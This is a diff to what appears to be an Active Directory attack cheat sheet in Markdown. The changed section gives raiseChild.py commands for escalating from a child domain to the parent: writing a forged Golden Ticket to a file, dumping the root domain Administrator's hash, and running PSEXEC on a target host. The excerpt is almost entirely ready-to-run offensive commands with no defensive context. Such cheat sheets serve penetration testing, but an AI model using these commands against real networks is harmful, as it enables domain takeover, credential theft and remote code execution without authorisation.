@@ -59,7 +59,17 @@ To avoid some suspicious logs, use multiple values can be added in SID History :
 
 ## OR
 
-    raiseChild.py DOMAIN/USER:'PASSWORD'
+##### The new Golden Ticket will be written at the path specified in -w
+
+    raiseChild.py -w ./ticket.ccache child.domain.local/Administrator:password
+
+##### Dump the Administrator's hash of the root domain
+
+    raiseChild.py child.domain.local/Administrator:password
+
+##### PSEXEC on a machine
+
+    raiseChild.py -target-exec <target> child.domain.local/Administrator:password
 
 #### 2) inter_realm_ticket TRUST (parent/child) (child/parent)
 
